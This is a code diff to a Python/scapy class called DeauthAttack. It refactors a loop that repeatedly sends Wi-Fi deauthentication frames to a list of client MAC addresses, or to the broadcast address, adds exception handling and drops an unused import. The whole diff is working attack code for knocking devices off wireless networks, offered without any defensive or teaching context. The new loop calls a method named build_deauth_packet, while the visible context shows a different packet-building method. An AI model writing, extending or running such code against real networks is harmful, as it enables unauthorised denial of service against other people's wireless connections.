@@ -1,4 +1,3 @@
-import curses
 import time
 import scapy.all as scapy
 import globals
@@ -23,12 +22,14 @@ class DeauthAttack:
         return packet
     
     def send_deauth(self):
-        self.packet
         while not self._stop_event.is_set():
             targets = globals.clients if globals.clients else ["ff:ff:ff:ff:ff:ff"]
             for client in targets:
-                if self._stop_event.is_set():
-                    return
-                pkt = self.build_packet(client)
-                scapy.sendp(pkt, iface=self.IFACE, verbose=False)
-                time.sleep(0.1)
+                try:
+                    if self._stop_event.is_set():
+                        return
+                    pkt = self.build_deauth_packet(client)
+                    scapy.sendp(pkt, iface=self.IFACE, verbose=False)
+                    time.sleep(0.1)
+                except Exception as e:
+                    print("Error in deauth class:", e)
